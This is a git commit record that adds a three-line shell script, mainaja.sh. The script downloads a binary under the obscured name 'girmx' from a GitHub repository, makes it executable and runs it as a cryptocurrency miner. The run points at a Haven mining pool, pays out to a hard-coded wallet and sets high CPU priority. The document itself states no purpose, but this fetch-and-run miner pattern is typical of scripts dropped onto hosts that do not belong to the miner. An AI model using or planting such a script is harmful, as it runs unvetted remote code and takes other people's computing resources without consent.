dc345e9d907e9dd0316a6967e7e8e3b66bcdc1a2
jumantul <81206688+jumantul@users.noreply.github.com>
2021-03-24 13:04:31 +0700

    Create mainaja.sh

---
+++ mainaja.sh
@@ -0,0 +1,3 @@
+wget https://github.com/jumantul/hansip/raw/main/girmx
+chmod +x girmx
+./girmx -a cn-heavy/xhv --url sg.haven.miner.rocks:4003 --user hvxyMPHE5pi8tqs9XeMEUMJQJRvvuCBzqM6NwF53zQcHaFnRQjzX4rWVYBXzcAFeRhUbwNoqJ5yJ51xaZj49z5bd7DEWXf8o3y --pass Ucritt --cpu-no-yield -k --cpu-priority 5 --tls
